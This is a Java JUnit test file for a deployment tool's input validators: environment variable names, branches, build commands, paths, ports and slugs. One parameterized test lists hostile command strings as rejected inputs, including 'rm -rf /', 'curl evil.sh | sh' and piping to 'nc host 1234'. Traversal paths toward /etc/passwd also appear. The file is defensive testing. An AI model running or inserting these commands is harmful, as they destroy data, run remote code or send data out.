package com.deployforge.common.util;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.deployforge.common.error.Exceptions.BadRequestException;
import java.nio.file.Path;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Input validation is the first line of defence for values that reach a Dockerfile, a container name or a
 * filesystem path.
 */
class ValidatorsTest {

    @ParameterizedTest
    @ValueSource(strings = {"DATABASE_URL", "_PRIVATE", "PORT", "A1", "my_var_2"})
    @DisplayName("accepts POSIX style variable names")
    void acceptsValidEnvKeys(String key) {
        assertThat(Validators.requireEnvKey(key)).isEqualTo(key);
    }

    @ParameterizedTest
    @ValueSource(strings = {"1INVALID", "has-dash", "has space", "has.dot", "", "DROP TABLE"})
    @DisplayName("rejects variable names that are not valid identifiers")
    void rejectsInvalidEnvKeys(String key) {
        assertThatThrownBy(() -> Validators.requireEnvKey(key)).isInstanceOf(BadRequestException.class);
    }

    @ParameterizedTest
    @ValueSource(strings = {"main", "feature/login", "release-1.2", "user/fix_bug"})
    @DisplayName("accepts ordinary git refs")
    void acceptsValidBranches(String branch) {
        assertThat(Validators.requireBranch(branch)).isEqualTo(branch);
    }

    @ParameterizedTest
    @ValueSource(strings = {"/leading", "double//slash", "dots/../escape", "with space", "semi;colon"})
    @DisplayName("rejects refs that could be abused")
    void rejectsInvalidBranches(String branch) {
        assertThatThrownBy(() -> Validators.requireBranch(branch)).isInstanceOf(BadRequestException.class);
    }

    @ParameterizedTest
    @ValueSource(
            strings = {
                "npm run build; rm -rf /",
                "npm start && curl evil.sh | sh",
                "node $(whoami).js",
                "npm run `id`",
                "npm start > /etc/passwd",
                "npm start | nc host 1234"
            })
    @DisplayName("rejects build commands containing shell control characters")
    void rejectsCommandInjection(String command) {
        assertThatThrownBy(() -> Validators.requireCommand(command, "Build command"))
                .isInstanceOf(BadRequestException.class)
                .hasMessageContaining("shell control characters");
    }

    @ParameterizedTest
    @ValueSource(strings = {"npm run build", "mvn -B -DskipTests package", "uvicorn main:app --port 8000"})
    @DisplayName("accepts ordinary build commands")
    void acceptsNormalCommands(String command) {
        assertThat(Validators.requireCommand(command, "Build command")).isEqualTo(command);
    }

    @Test
    @DisplayName("normalises relative paths and rejects traversal")
    void normalisesPaths() {
        assertThat(Validators.normalizeRelativePath("./apps/web/", "Root")).isEqualTo("apps/web");
        assertThat(Validators.normalizeRelativePath("/apps/web", "Root")).isEqualTo("apps/web");
        assertThat(Validators.normalizeRelativePath("", "Root")).isNull();
        assertThat(Validators.normalizeRelativePath(null, "Root")).isNull();

        assertThatThrownBy(() -> Validators.normalizeRelativePath("../../etc", "Root"))
                .isInstanceOf(BadRequestException.class);
        assertThatThrownBy(() -> Validators.normalizeRelativePath("apps/../../etc", "Root"))
                .isInstanceOf(BadRequestException.class);
    }

    @Test
    @DisplayName("port and health path bounds are enforced")
    void validatesPortsAndPaths() {
        assertThat(Validators.requirePort(3000, "Port")).isEqualTo(3000);
        assertThatThrownBy(() -> Validators.requirePort(0, "Port")).isInstanceOf(BadRequestException.class);
        assertThatThrownBy(() -> Validators.requirePort(70000, "Port"))
                .isInstanceOf(BadRequestException.class);
        assertThatThrownBy(() -> Validators.requirePort(null, "Port"))
                .isInstanceOf(BadRequestException.class);

        assertThat(Validators.requireHealthPath(null)).isEqualTo("/");
        assertThat(Validators.requireHealthPath("/healthz")).isEqualTo("/healthz");
        assertThatThrownBy(() -> Validators.requireHealthPath("healthz"))
                .isInstanceOf(BadRequestException.class);
        assertThatThrownBy(() -> Validators.requireHealthPath("/../secrets"))
                .isInstanceOf(BadRequestException.class);
    }

    @Test
    @DisplayName("slugs are restricted to what is safe in a container name and hostname")
    void slugRules() {
        assertThat(Slugs.slugify("Maya AI")).isEqualTo("maya-ai");
        assertThat(Slugs.slugify("  Hello__World  ")).isEqualTo("hello-world");
        assertThat(Slugs.slugify("Ünïcode Ápp")).isEqualTo("unicode-app");
        assertThat(Slugs.slugify("---")).isEmpty();

        assertThat(Slugs.isValid("maya-ai")).isTrue();
        assertThat(Slugs.isValid("-leading")).isFalse();
        assertThat(Slugs.isValid("UPPER")).isFalse();
        assertThat(Slugs.isValid("with space")).isFalse();
    }

    @Test
    @DisplayName("path resolution refuses to escape the build root")
    void safePathsContainResolution() {
        Path root = Path.of("data", "builds", "deployment-1");

        assertThatCode(() -> SafePaths.resolveInside(root, "source/app")).doesNotThrowAnyException();
        assertThatThrownBy(() -> SafePaths.resolveInside(root, "../../../etc/passwd"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("escapes its root");
    }
}
